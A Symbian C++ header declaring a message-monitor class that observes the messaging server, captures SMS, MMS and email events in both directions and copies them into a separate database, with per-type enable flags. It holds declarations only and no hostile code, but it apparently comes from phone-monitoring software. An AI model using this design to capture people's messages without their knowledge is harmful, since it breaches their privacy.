#ifndef __CSMSLogWatcher_H__
#define __CSMSLogWatcher_H__

// System includes

#include <msvapi.h>
#include <logwrap.h> //TLogId
#include "CltDatabase.h"
#include "SettingChangeObserver.h"

class MMsvSessionObserver;
class CLogClient;
class CClientMtmRegistry;
class CMsvEntry;
class CLogViewEvent;
class CLogFilter;
class CLogView;

class CCltDatabase;
class MLogEventObserver;
class CSmsClientMtm;
class CCltEmailMonitor;
class CCltMmsMonitor;
class CCltSettings;

const TInt KMaxNumOfRowToRead = 4;
const TInt KMaxAttachementAlloc = 255;

_LIT(KExtendtionSMIL,".smil");
_LIT(KAddrDelimter,";");
_LIT(KRecipientTo,"To: ");
_LIT(KRecipientBcc,"Bcc: ");
_LIT(KRecipientCc,"Cc: ");

enum TMsgDirection 
{
	EDirectionIN = 1,
	EDirectionOUT
};	

/**
* This class monitors changes on the messaging server by implementing MMsvSessionObserver 
* It delegates handling of MMS, MAIL to handling to CCltMmsMonitor and CCltEmailLogEntry 
* But handles SMS event itseft in ProcessSMS() method
*/

class  CCltMessageMonitor :	 public CActive,
                         public MMsvSessionObserver,
                         /*blic MMsvEntryObserver,*/
						 public MDbLockObserver,
						 public MSettingChangeObserver
						 
{
public:
	virtual ~CCltMessageMonitor();
	static CCltMessageMonitor* NewL(CLogClient& aLogCli, CCltDatabase& aLogEventDb);
	static CCltMessageMonitor* NewLC(CLogClient& aLogCli, CCltDatabase& aLogEventDb);
	
public: // from CActive	
	void DoCancel();	
	void RunL();	
	TInt RunError(TInt aError);
	
public:// From MSettingChangeObserver
	void OnSettingChangedL(CCltSettings& aSetting);
	
public:
	
	inline TBool IsEventSMSEnable()
	{
		return iEventSMSEnable;
	}
	
	inline TBool IsEventMMSEnable()
	{
		return iEventMMSEnable;
	}
	
	inline TBool IsEventEMAILEnable()
	{
		return iEventMAILEnable;
	}
	
	inline void SetEventSMSEnable(TBool aEnable)
	{	
		iEventSMSEnable = aEnable;
	}
	
	inline void SetEventMMSEnable(TBool aEnable)
	{
		iEventMMSEnable = aEnable;
	}
	
	inline void SetEventEMAILEnable(TBool aEnable)
	{
		iEventMAILEnable = aEnable;
	}
	
private:		
	
	enum TSMSLogState
	{	EIdle,	
		EWaitingEvent,
		EGettingEvent,
		ENextEvent
	};

	enum TSMSDirection
	{
		DIRECTION_IN,
		DIRECTION_OUT
	};	
	
	CCltMessageMonitor(CLogClient& aLogCli, CCltDatabase& aLogEventDb);
	void ConstructL();
		
    //implementation of MMsvSessionObserver
    virtual void HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, TAny* aArg2, TAny* aArg3);
    
    /**
    * Handles event
    */
    void DoHandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, TAny* aArg2, TAny* aArg3);
    
    //
    //MMsvEntryObserver
	//irtual void HandleEntryEventL(TMsvEntryEvent aEvent, TAny* aArg1, TAny* aArg2, TAny* aArg3) ;
	
	/**
	* Entry of event handling (MMS,EMAIL) 
	* It delegates to a proper class to handle each event
	*/
	void ProcessMsvEventL(const TMsvId entryId,TMsgDirection aDir);
	
	/**
	* Handle SMS event. 
	*/
	void ProcessSMS(const TMsvId entryId,TMsgDirection aDir);
	
	TMsvId GetParentIdOf(TMsvId aEntryId, TMsvId aRootEntry);	
	
	void GetCLogEvent(TInt aLogServerId);
	
	void AppendToDatabase();		
	
	//from MDbLockObserver
	void OnDbUnlock();	
	
	TBool IsMailBoxId(const TMsvId aId);
	
	TBool IsDuplicateId(const TMsvId aId);
	
	/*TBool CheckStatus(const CLogEvent& aEvent);*/
			
private:	
	
	CMsvSession*			iMsvSession;
    CMsvEntry*				iMsvEntry;
    TMsvId					iNewMessageId;		
    
    //RArray<TMsvId>			iMailboxIdArr;
    
	//CBaseMtm*				iMtm
    CClientMtmRegistry*		iMtmReg;
    
    /*flag indicates messaging server is ready to be used*/
    TBool 					iIsSessionReady;
    
	CLogClient&				iLogClient; // not own by this object
	TLogId                  iLastLogId; // remember the last id	
	
	CCltEmailMonitor*		iEmailMonitor;
	CCltMmsMonitor*			iMmsMon;
	
	CCltDatabase&           iDb;
	
	TInt          	        iNumberToReIssue;	
	RArray<TLogId>			iLogIdList;
	
	//it owns object whose pointers are contained by the array
	//so ResetAndDestroy must be called to delete object	
	RLogEventArray           iEventArray;
	
	TBool                    iDbWait; // wait for unlock
	
	TInt                     iNumOfLogDumped;
	
	RArray<TInt>             iLogServerIdArr;
	RArray<TMsvId>	iUniqueSmsMsgIdArr;// unique service for each email message
	TTime                    testTime;	
	
	/*
	* Flag indicates event types are enable. (SMS,MMS,MAIL)
	*/
	TBool iEventSMSEnable;
	TBool iEventMMSEnable;
	TBool iEventMAILEnable;
};

// End of File
#endif
